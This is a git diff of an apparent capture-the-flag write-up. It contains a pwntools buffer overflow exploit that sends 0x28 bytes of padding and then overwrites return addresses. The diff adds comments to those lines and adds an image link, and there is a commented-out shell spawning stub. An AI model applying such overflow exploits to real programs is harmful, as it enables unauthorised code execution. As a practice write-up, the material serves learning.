@@ -43,8 +43,8 @@ io = start()
 
 io.recvuntil(b">")
 payload = b'0'* 0x28 
-payload+= p32(0x0804862b)
-payload += p32(0x0804862c)
+payload+= p32(0x0804862b) #return address of pwnme
+payload += p32(0x0804862c) #address of pwnme
 io.send(payload)# shellcode = asm(shellcraft.sh())
 # payload = fit({
 #     32: 0xdeadbeef,
@@ -57,3 +57,4 @@ io.send(payload)# shellcode = asm(shellcraft.sh())
 io.interactive()
 
 ```
+![image](https://github.com/fidgetaryan445/NIghtmare/assets/148867576/a0943d20-5f94-4dd2-a0fc-62c0746ddc06)
